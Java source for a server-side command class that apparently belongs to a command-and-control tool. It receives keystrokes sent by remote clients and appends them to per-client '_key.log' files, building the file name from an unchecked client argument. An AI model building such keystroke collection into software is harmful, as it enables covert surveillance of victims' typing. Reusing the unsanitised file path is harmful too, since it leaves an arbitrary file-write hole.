package commands;

import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;

import server.CommandServer;
import tools.ParsedCommand;

/**
 * Logs a key press sent by the client
 * 
 * @author Yohan Chalier
 *
 */
public class KLogCmd extends ServerCommand {

	public KLogCmd(CommandServer c2) {
		super(c2);
	}
	
	@Override
	public String exec(ParsedCommand pCmd) {
		// Reading sent line
		StringBuilder sb = new StringBuilder();
		for (int i = 0; i < pCmd.payload.length; i++)
			sb.append((char) pCmd.payload[i]);
		
		// Adding it to log file
		try {
			PrintWriter writer = new PrintWriter(
					new FileWriter(pCmd.args[0] + "_key.log", true));
			writer.println(sb.toString());
			writer.close();
		} catch (IOException e) {
			e.printStackTrace();
		}
		
		// Returning DONE to automatically close the connection
		// and the associated thread of this sending.
		return DONE;
	}

}
